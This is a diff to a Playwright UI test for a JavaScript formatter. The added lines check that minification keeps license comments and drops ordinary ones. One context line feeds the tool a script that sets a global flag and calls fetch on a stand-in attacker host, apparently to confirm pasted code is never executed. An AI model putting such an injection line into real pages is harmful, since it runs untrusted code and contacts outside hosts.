@@ -53,6 +53,18 @@ def run_source_formatter_desktop(page, report: dict, _inventory) -> None:
     expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
         re.compile(r"const add=")
     )
+    page.locator("[data-javascript-formatter] [data-input]").fill(
+        "/*! license */\n// ordinary note\nconst value = 1;"
+    )
+    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
+        re.compile(r"license")
+    )
+    if "ordinary note" in page.locator(
+        "[data-javascript-formatter] [data-output]"
+    ).input_value():
+        report["ui_detail_failures"].append(
+            "JavaScript minify preserved ordinary comments without opt-in."
+        )
     page.evaluate("globalThis.__plainToolAttack = 0")
     page.locator("[data-javascript-formatter] [data-input]").fill(
         'globalThis.__plainToolAttack=3;fetch("https://attacker.invalid/javascript")'
